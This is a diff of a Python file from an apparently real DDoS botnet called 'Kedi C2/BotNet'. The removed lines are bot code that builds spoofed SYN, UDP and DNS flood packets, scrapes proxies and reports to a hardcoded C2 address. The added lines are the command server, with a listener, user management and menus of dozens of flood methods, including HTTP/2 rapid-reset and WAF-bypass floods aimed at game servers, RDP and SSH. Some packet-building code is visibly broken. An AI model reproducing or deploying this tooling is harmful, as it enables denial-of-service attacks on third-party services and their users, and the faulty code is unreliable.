@@ -1,1113 +1,895 @@
-from socket import socket , AF_INET , SOCK_STREAM , SOCK_DGRAM , SOCK_RAW , TCP_NODELAY , IPPROTO_TCP , IP_HDRINCL , IPPROTO_IP , IPPROTO_UDP , inet_aton
-from time import sleep
-from time import time
+from socket import socket , AF_INET , SOCK_STREAM , SOL_SOCKET , SO_REUSEADDR
 from threading import Thread as thr
-from urllib.parse import urlparse , urlunsplit
-from random import choice as che
-from random import randint as ran
-from random import _urandom as byt
-from certifi import where
-from ssl import CERT_NONE , create_default_context , SSLContext , PROTOCOL_TLSv1_2
-from fake_useragent import UserAgent
-from string import ascii_letters , digits
-from struct import pack
-from selenium import webdriver
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.options import Options
-from selenium.webdriver.common.action_chains import ActionChains
-from selenium.webdriver.support.wait import WebDriverWait
-from socks import socksocket , SOCKS5
+from colorama import Fore , init
+from datetime import datetime
+from time import time , sleep
+from json import load , dump
+from pystyle import Colorate , Colors
+from os import system , name , path
 from requests import get
-from h2.connection import H2Connection
-from base64 import b64encode
-from re import compile as compilee
+from urllib.parse import urlparse
+from base64 import b64encode , b64decode
+from urllib.parse import urlparse
 
-app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
-reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']
+init()
 
-ipc2 = '198.50.160.231'
-portc2 = 666
+red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;
 
-def strm(siz):
-        return '%0x' % ran(0, 16 ** siz)
+LIGHTGREEN = '\033[92m'
+LIGHTYELLOW = '\033[93m'
+LIGHTCYAN = '\033[96m'
+LIGHTBLUE = '\033[94m'
+LIGHTMAGENTA = '\033[95m'
+LIGHTRED = '\033[91m'
+LIGHTBLSYN = '\033[90m'
+LIGHTWHITE = '\033[97m'
+LIGHTPINK = "\x1b[38;5;206m"
+LIGHTPURPLE = "\x1b[38;5;91m"
+LIGHTAQUA = "\x1b[38;5;49m"
+LIGHTBLACK = "\x1b[38;5;232m"
+RESET = '\033[0;0m'
 
-def spo_ip():
-        addr = [192, 168, 0, 1]; d = '.'; addr[0] = str(ran(11, 197)); addr[1] = str(ran(0, 255)); addr[2] = str(ran(0, 255)); addr[3] = str(ran(2, 254)); ass = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]; return ass
+banner = f"""
+                             ,MMM8&&&.
+                        _...MMMMM88&&&&..._
+                     .::'''MMMMM88&&&&&&'''::.
+                    ::     MMMMM88&&&&&&     :: Kedi C2/BotNet 
+                    '::....MMMMM88&&&&&&....::' Version 1.0
+                       `''''MMMMM88&&&&''''`
+                             'MMM8&&&'
 
-def dns_gen(target):
-        transaction_id = 0x1234
-        flags = 0x0100
-        questions = 1
-        answer_rrs = 0
-        authority_rrs = 0
-        additional_rrs = 0
-        header = pack('>HHHHHH' , transaction_id , flags , questions, answer_rrs , authority_rrs , additional_rrs)
-        qtype = 1
-        qclass = 1
-        domain_parts = target.split('.')
-        qname = b''.join(pack('B', len(part)) + part.encode() for part in domain_parts) + b'\x00'
-        question = qname + pack('>HH', qtype, qclass)
-        dns_payload = header + question
-        return dns_payload
+		          ╚╦════════════════════════════════════════════╦╝
+       ╔═════╩════════════════════════════════════════════╩═════╗
 
-def syn_gen(target  ,  port):
-        ip_h = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 , 54321 , 0 , 255 , IPPROTO_TCP , 0 , inet_aton(target) , inet_aton(target))
-        tcp_h = pack('!HHLLBBHHH' , port , port , 0 , 0 , 18 , 0 , 8192 , 0 , 0)
-        return ip_h + tcp_h
+		  	          ✧ The Best C2/BotNet || By : - 𝙴𝚡𝚙𝚕𝚘!𝚝 ✧
 
-def gen_payl():
-        size = ran(512 , 1024)
-        payload = byt(size)
-        payl = "b'"
-        for i , b in enumerate(payload):
-            payl += f"\\x{b:02x}"
-            if (i + 1) % 16 == 0 and i != len(payload) - 1:
-                payl += "'\nb'"
-        payl += "'"
-        return payload
+       ╚════════════════════════════════════════════════════════╝"""
 
-def wait_for_load_event(driver , event , timeout , retries = 0):
-        if retries == timeout:
-            return Exception("timeout exceeded")
-        try:
-            sleep(1)
-            state = driver.execute_script("return document.readyState")
-            if state != "complete":
-                wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)
-        except:
-            wait_for_load_event(driver=driver , event=event , timeout=timeout , retries=retries + 1)
+banner1 = """
+\r
+\r                             ,MMM8&&&.
+\r                        _...MMMMM88&&&&..._
+\r                     .::'''MMMMM88&&&&&&'''::.
+\r                    ::     MMMMM88&&&&&&     :: Kedi C2/BotNet 
+\r                    '::....MMMMM88&&&&&&....::' Version 1.0
+\r                       `''''MMMMM88&&&&''''`
+\r                             'MMM8&&&'
+\r
+\r            ╚╦════════════════════════════════════════════╦╝
+\r       ╔═════╩════════════════════════════════════════════╩═════╗
+\r
+\r               ✧ The Best C2/BotNet || By : - 𝙴𝚡𝚙𝚕𝚘!𝚝 ✧
+\r
+\r       ╚════════════════════════════════════════════════════════╝\n
 
-def wait_for_navigate(driver):
-        wait_for_load_event(driver=driver , event="loading" , timeout=30)
-        wait_for_load_event(driver=driver , event="complete " , timeout=30)
+"""
 
-def wait_for_selector_visible(driver, selector, timeout):
-        WebDriverWait(driver=driver, timeout=timeout, poll_frequency=1).until(
-            lambda driver: driver.find_element("css selector" , selector).is_displayed()
-        )
+with open("src/data.json" , encoding="utf-8") as filej:
+    loadd = load(filej)
+    filej.close()
+    cnc_ip = str(loadd['cnc_ip'])
+    cnc_port = int(loadd['cnc_port'])
+    try:
+        with open("src/data.json", encoding="utf-8") as filej:
+            loadd = load(filej)
+            cnc_ip = str(loadd['cnc_ip'])
+            cnc_port = int(loadd['cnc_port'])
+    except FileNotFoundError:
+        print(f"{red}[{yellow}!{red}] {red}File 'src/data.json' not found !")
+        exit()
+    except KeyError as e:
+        print(f"{red}[{yellow}!{red}] {red}Missing key in JSON {blue}:{red} {e}")
+        exit()
+try:
+    s = socket(AF_INET , SOCK_STREAM)  
+    s.setsockopt(SOL_SOCKET , SO_REUSEADDR , 1)
+    s.bind((cnc_ip , cnc_port))
+    s.listen()
+    system('cls' if name == 'nt' else 'clear')
+    print(Colorate.Horizontal(Colors.red_to_blue , banner , 2))
+    print(f'\n {red}[{yellow}+{red}] {green}Connected {cyan}:)\n')
+    print(f' {red}[{yellow}+{red}] {green}Logs {cyan}:))')
+except OSError as e:
+    print(f"{red}[{yellow}+{red}] {red}Cannot bind because the port is already in use or another issue occurred {blue}:{red} {e}")
+    exit()
+except Exception as e:
+    print(f"{red}[{yellow}+{red}] {red}An unexpected error occurred: {e}")
+    exit()
 
-def udp_raw_head(target , port):
-    ip_ver_ihl = 69
-    ip_tos = 0
-    ip_tot_len = 0
-    ip_id = 54321
-    ip_frag_off = 0
-    ip_ttl = 255
-    ip_proto = IPPROTO_UDP
-    ip_check = 0
-    ip_saddr = inet_aton(target)
-    ip_daddr = inet_aton(target)
-    udp_length = 8
-    udp_checksum = 0
-    targetx = target
-    portx = port
-    header = pack('!BBHHHBBH4s4sHHHH' , ip_ver_ihl , ip_tos , ip_tot_len , ip_id , ip_frag_off , ip_ttl, ip_proto , ip_check , ip_saddr , ip_daddr , udp_length , udp_checksum , targetx , portx)
-    return header
+banner_xd = """\033c
 
-def game_udp(target , port):
-    msg = "<==kedi-c2/botnet-on-top-mother-fucker==>"
-    udp_length = 8 + len(msg)
-    pseudo_header_checksum = 0
-    udp_header = pack('!HHHH' , port , port , udp_length , pseudo_header_checksum)
-    s = 0
-    for i in range(0 , len(msg) , 2):
-        w = (msg[i] << 8) + (msg[i+1])
-        s = s + w
-    s = (s >> 16) + (s & 0xffff)
-    s = s + (s >> 16)
-    s = ~s & 0xffff
-    pseudo_header = pack('!4s4sBBH' , target , target , 0 , IPPROTO_UDP , len(msg))
-    pseudo_packet = pseudo_header + msg.encode()
-    udp_hdr_with_checksum = pack('!HHHH' , port , port , len(msg))
-    head = pack('!HHHH' , port , port , udp_length , pseudo_header_checksum , pseudo_packet , udp_header , udp_hdr_with_checksum , pseudo_header , pseudo_packet)
-    return head
+\r⠀\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\r⠀⠀\033[92m⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\r⠀⠀⠀\033[92m⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\r⠀⠀⠀⠀\033[92m⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+\r⠀⠀⠀⠀⠀\033[92m⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
+\r⠀⠀⠀⠀⠀⠀\033[92m⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀  Welcome To KediC2/Botnet
+\r⠀⠀⠀\033[97m⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀    \033[97mCreated By itzexploit
+\r⠐⠀\033[97m⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀        \033[97mVersion 1.0
+\r⠈\033[97m⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
+\r⠠⠀\033[97m⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
+\r⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[92m⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
+\r⠀⠀⠀⠀⠀\033[92m⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉\n \033[97m⠀⠀⠀⠀⠀
 
-def game_tcp(target  ,  port):
-    ip_h = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 , 54321 , 0 , 255 , SOCK_STREAM , 0 , inet_aton(target) , inet_aton(target))
-    tcp_h = pack('!HHLLBBHHH' , port , port , 0 , 0 , 18 , 0 , 8192 , 0 , 0)
-    return ip_h + tcp_h
+"""
 
-def r6_gen(target , port):
-    data = "pos_x:120,y:240,shoot"
-    ip_ver_ihl = 69
-    ip_tos = 0
-    ip_tot_len = 0
-    ip_id = 54321
-    ip_frag_off = 0
-    ip_ttl = 255
-    ip_proto = SOCK_DGRAM
-    ip_check = 0
-    ip_saddr = inet_aton(target)
-    ip_daddr = inet_aton(target)
-    udp_length = 8
-    udp_checksum = 0
-    targetx = target
-    portx = port
-    header = pack('!BBHHHBBH4s4sHHHH' , ip_ver_ihl , ip_tos , ip_tot_len , ip_id , ip_frag_off , ip_ttl, ip_proto , ip_check , ip_saddr , ip_daddr , udp_length , udp_checksum , targetx , portx , data)
-    return header
+file_path = 'ongoing_attacks.json'
 
-class tcpamp:
-    def __init__(self , source_port , dest_port , seq_num , ack_num , data_offset , flags , window_size , checksum , urgent_pointer):
-        self.source_port = source_port
-        self.dest_port = dest_port
-        self.seq_num = seq_num
-        self.ack_num = ack_num
-        self.data_offset = data_offset
-        self.flags = flags
-        self.window_size = window_size
-        self.checksum = checksum
-        self.urgent_pointer = urgent_pointer
+def load_attacks():
+    if path.exists(file_path):
+        with open(file_path , 'r') as file:
+            return load(file)
+    return {}
 
-    def pack(self):
-        return pack('!HHLLBBHHH',
-                        self.source_port ,
-                        self.dest_port ,
-                        self.seq_num ,
-                        self.ack_num ,
-                        (self.data_offset << 4) | self.flags ,
-                        self.window_size ,
-                        self.checksum ,
-                        self.urgent_pointer)
+def load_files(file_path='src/users.json'):
+    try:
+        if path.exists(file_path):
+            with open(file_path , 'r') as file:
+                return load(file)
+        else:
+            return {}
+    except:
+        pass
 
-class udpxd:
-    def __init__(self, source_port, dest_port, length, checksum, data):
-        self.source_port = source_port
-        self.dest_port = dest_port
-        self.length = length
-        self.checksum = checksum
-        self.data = data
+def save_files(data , file_path='src/users.json'):
+    try:
+        with open(file_path , 'w') as file:
+            dump(data , file , indent=4)
+    except:
+        pass
 
-    def pack(self):
-        header = pack('!HHHH' , self.source_port , self.dest_port , self.length , self.checksum)
-        return header + self.data
+def save_attacks(attacks):
+    with open(file_path , 'a') as file:
+        dump(attacks, file)
 
-def tcp_paf_data(target , port):
-    source_ip = f"{ran(1, 223)}.{ran(0, 255)}.{ran(0, 255)}.{ran(0, 255)}"
-    source_port = ran(1024, 65535)
-    seq = ran(0 , 4294967295)
-    ack = 0
-    flags = 0x18
-    tcp_header = pack('!HHLLBBHHH' , source_port , port , seq , ack , 5 << 4 , flags , 65535 , 0 , 0)
-    ip_header = pack('!BBHHHBBH4s4s' , 69 , 0 , 20 + len(tcp_header) , 54321 , 0 , 255 , 6 , 0 , inet_aton(source_ip) , inet_aton(target))
-    return ip_header + tcp_header
+help = f"""
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}!{LIGHTMAGENTA}layer7          {LIGHTRED}:     {LIGHTGREEN}Layer7 Methods Banner  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}!{LIGHTMAGENTA}layer4          {LIGHTRED}:     {LIGHTGREEN}Layer4 Methods Banner  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}!{LIGHTMAGENTA}methods         {LIGHTRED}:     {LIGHTGREEN}Layer 7 & 4 Methods Banner  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}clear           {LIGHTRED}:     {LIGHTGREEN}Clear Page  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}home            {LIGHTRED}:     {LIGHTGREEN}Back to home  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}tools           {LIGHTRED}:     {LIGHTGREEN}Show Tools Menu  {LIGHTRED}•\
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}?{LIGHTMAGENTA}plan            {LIGHTRED}:     {LIGHTGREEN}Show Your Plan Info  {LIGHTRED}•n
+\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
+"""
 
-def handshaketcp(port):
-    seq = ran(0 , 65535)
-    ack = 0
-    offset_res = (5 << 4) + 0
-    flags = 0x02
-    window = socket.htons(5840)
-    checksum = 0
-    urgent_pointer = 0
-    tcp_header = pack('!HHLLBBHHH' , port , port , seq ,ack , offset_res , flags , window , checksum , urgent_pointer)
-    return tcp_header
+help_admin = f"""
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}banuser         {LIGHTRED}:     {LIGHTGREEN}Ability to ban  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}unban           {LIGHTRED}:     {LIGHTGREEN}Ability to unban  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}adduser         {LIGHTRED}:     {LIGHTGREEN}Ability to add user  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}deluser         {LIGHTRED}:     {LIGHTGREEN}Ability to delere user  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}home            {LIGHTRED}:     {LIGHTGREEN}Back to home  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}tools           {LIGHTRED}:     {LIGHTGREEN}Show Tools Menu  {LIGHTRED}•\n
+\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
+"""
 
-def tcp_connhex(path , target , ua , cookie):
-    payl = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nCookie: {cookie}\r\n\r\n"
-    payl_bytes = payl.encode('utf-8')
-    hex_payload = ''.join(f'\\x{b:02x}' for b in payl_bytes)
-    return hex_payload
+def text2Gen(word):
+    start_color = (0, 0, 200)
+    end_color   = (255, 0, 0)
+    num_letters = len(word)
+    step_r = (end_color[0] - start_color[0]) / num_letters
+    step_g = (end_color[1] - start_color[1]) / num_letters
+    step_b = (end_color[2] - start_color[2]) / num_letters
+    reset_color = "\033[0m"
+    current_color = start_color
+    colored_word = ""
+    for i, letter in enumerate(word):
+        color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
+        colored_word += f"{color_code}{letter}{reset_color}"
+        current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)
+    return colored_word
 
+methods = f"""
+\r{LIGHTRED} - {LIGHTYELLOW}Layer4\n
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp          {LIGHTRED}:     {LIGHTGREEN}UDP FLOOD RANDOM DATA  {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD RANDOM DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}gudp         {LIGHTRED}:     {LIGHTGREEN}UDP HEX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}gtcp         {LIGHTRED}:     {LIGHTGREEN}TCP HEX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}dns          {LIGHTRED}:     {LIGHTGREEN}DNS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}syn          {LIGHTRED}:     {LIGHTGREEN}SYN FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-bypass   {LIGHTRED}:     {LIGHTGREEN}UDP FLOOD & BEST HEX PAYLOAD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-bypass   {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD & BEST HEX PAYLOAD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}ts3          {LIGHTRED}:     {LIGHTGREEN}TS3 KILLER {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}fiv          {LIGHTRED}:     {LIGHTGREEN}FIVEM UDP MIX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}vse          {LIGHTRED}:     {LIGHTGREEN}VALVE SOURCE ENGINE FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}pps          {LIGHTRED}:     {LIGHTGREEN}UDP & TCP MIX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}game         {LIGHTRED}:     {LIGHTGREEN}TCP & UDP MIX ATTACK TO ALL GAMES {LIGHTBLUE}({LIGHTGREEN} MTA {LIGHTRED},{LIGHTGREEN} FIVEM {LIGHTRED},{LIGHTGREEN} MINCRAFT {LIGHTRED}, {LIGHTGREEN}DDNET {LIGHTRED},{LIGHTGREEN} CS2{LIGHTBLUE} ) {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-raw      {LIGHTRED}:     {LIGHTGREEN}UDP RAW HEADER HEXADECIMAL WITH BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-raw      {LIGHTRED}:     {LIGHTGREEN}TCP RAW HEADER HEXADECIMAL WITH BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}r6           {LIGHTRED}:     {LIGHTGREEN}RainbowSix ( R6 ) CUSTOM UDP HEADER BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-boom     {LIGHTRED}:     {LIGHTGREEN}TCP AMPLIFICATION & TCP BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-boom     {LIGHTRED}:     {LIGHTGREEN}WSD & UDP AMPLIFICATION & UDP BYPASS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}discord      {LIGHTRED}:     {LIGHTGREEN}DISCORD VOICE UDP FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-paf      {LIGHTRED}:     {LIGHTGREEN}TCP & PSH MIX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-conn     {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD TO PROTECTED SSL & TLSV1.2 DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-hand     {LIGHTRED}:     {LIGHTGREEN}TCP HANDSHAKE HEX FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-80       {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD PORT 80 KILLER WITH HEX DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}rdp          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD KILL RDP WITH HEX DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}ssh          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD KILL SSH WITH HEX DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-storm    {LIGHTRED}:     {LIGHTGREEN}NORMAL TCP BYPASS WITH HEX DATA {LIGHTRED}•\n
+\r{LIGHTRED} - {LIGHTYELLOW}Layer7\n
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}raw          {LIGHTRED}:     {LIGHTGREEN}HIGH PPS GET FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}get          {LIGHTRED}:     {LIGHTGREEN}GET FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}rapid-reset  {LIGHTRED}:     {LIGHTGREEN}HTTP/2.0 FLOOD USING LEGIT HEADERS WITH RAPID RESET EXPLOIT AND FLOOD WITH PROXY AND SSL , TLS {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}spoof        {LIGHTRED}:     {LIGHTGREEN}GET HEADER SPOOF FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}post         {LIGHTRED}:     {LIGHTGREEN}POST FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}put          {LIGHTRED}:     {LIGHTGREEN}PUT FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}bypass       {LIGHTRED}:     {LIGHTGREEN}HTTP1.1 FLOOD WITH SSL AND HEADER & IP SPOOF AND BYPASS ALL WAFs {LIGHTBLUE}({LIGHTGREEN} Cloudflare {LIGHTRED},{LIGHTGREEN} ArvanCloud {LIGHTRED},{LIGHTGREEN} Akamai {LIGHTRED},{LIGHTGREEN} Fastly{LIGHTBLUE} ) {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}browser      {LIGHTRED}:     {LIGHTGREEN}CHROME BASED FLOOD MADE FOR BYPASS CAPTCHA & UAM {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}http         {LIGHTRED}:     {LIGHTGREEN}GET FLOOD WITHOUT SSL , TLS {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}xmlrpc       {LIGHTRED}:     {LIGHTGREEN}WORDPRESS XMLRPC POST FLOOD WITH XML DATA {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}http-mix     {LIGHTRED}:     {LIGHTGREEN}GET & POST & HEAD MIX FLOOD HIGH PPS {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}spoof-storm  {LIGHTRED}:     {LIGHTGREEN}GET HEADER SPOOF FLOOD WITH PROXY SOCKS5 AND HIGH PPS FLOOD {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}https        {LIGHTRED}:     {LIGHTGREEN}GET HTTP/2.0 FLOOD WITH SSL , TLS AND FLOOD WITH PROXY & HIGH PPS {LIGHTRED}•\n
+\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
+"""
 
-def get_cookies(driver):
-    cookies = driver.get_cookies()
-    pieces = []
-    for cookie in cookies:
-        cookie_string = cookie["name"] + "=" + cookie["value"]
-        pieces.append(cookie_string)
-    return ";".join(pieces)
+tools = f"""
 
-def socks5geter():
-    prapi1 = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
-    prapi2 = "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=http&proxy_format=ipport&format=text&timeout=1000"
-    prapi3 = "https://www.proxy-list.download/api/v1/get?type=http"
-    pf = open('theprxy.txt', 'w+')
-    rq = (get(prapi1).text).split()
-    for pyy in rq:
-        pf.write(pyy + '\n')
-    pf.close()
-    pf = open('theprxy.txt' , 'a')
-    rq = (get(prapi2).text).split()
-    pf.write('\n')
-    for pyy in rq:
-        pf.write(pyy + '\n')
-    pf.close()
-    pf = open('theprxy.txt' , 'a')
-    rq = (get(prapi3).text).split()
-    pf.write('\n')
-    for pyy in rq:
-        pf.write(pyy + '\n')
-    pf.close()
+\r{LIGHTRED} - {LIGHTYELLOW}Tools\n
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.clear        {LIGHTRED}:     {LIGHTGREEN}CLEAR PAGE {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.home         {LIGHTRED}:     {LIGHTGREEN}BACK TO HOME PAGE {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.lookup       {LIGHTRED}:     {LIGHTGREEN}LOOKUP IP & WEBSITE {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.paping       {LIGHTRED}:     {LIGHTGREEN}TCP PING {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.bots         {LIGHTRED}:     {LIGHTGREEN}SHOW BOTS COUNT {LIGHTRED}•
+\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.ongoing      {LIGHTRED}:     {LIGHTGREEN}SHOWS CURRENT ATTACKS {LIGHTRED}•
